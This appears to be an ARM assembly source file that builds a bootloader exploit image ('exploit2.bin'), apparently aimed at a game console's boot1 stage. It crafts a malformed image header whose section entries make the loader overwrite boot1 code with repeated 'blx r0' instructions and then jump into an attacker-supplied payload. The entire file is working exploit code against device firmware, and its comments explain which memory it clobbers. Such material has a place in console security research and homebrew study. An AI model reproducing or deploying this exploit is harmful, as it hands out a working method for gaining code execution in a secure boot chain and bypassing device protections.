.arm.big
.create "exploit2.bin", 0
.incbin "sdboot1.ancast"
.align 0x80000
; Toucan image header
.word 0xfd9b5b7a ; magic
.word 3 ; section count
.word 0x01808000, 0x01808800 ; some space in Napa to clobber
.word 0 ; flags
.word 0 ; syscfg1 (unused as flag for that is unset)
.word 0, 0 ; unused
; Section headers
.word 0x0d400700 ; address of code to overwrite in boot1 based at 0x0d400000
.word section1end-section1 ; size
.word 0x08000500 ; address of code to overwrite in boot1 based at 0x08000000
.word section2end-section2 ; size
.word 0          ; address of payload
.word section3end-section3 ; size
.align 0x20
; Section data
.thumb
section1:
; Overwrite 0x100 bytes with blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
section1end:
.align 0x20
section2:
; Overwrite 0x100 bytes with blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0 :: blx r0
section2end:
.align 0x20
section3:
.thumb
ldr r0, =0x01000200
ldr r1, [r0] ; load HdrSize
add r0, r0, r1 ; r0 = ancast body + HdrSize
blx r0 ; jump
.pool
section3end:
.align 0x10000
.close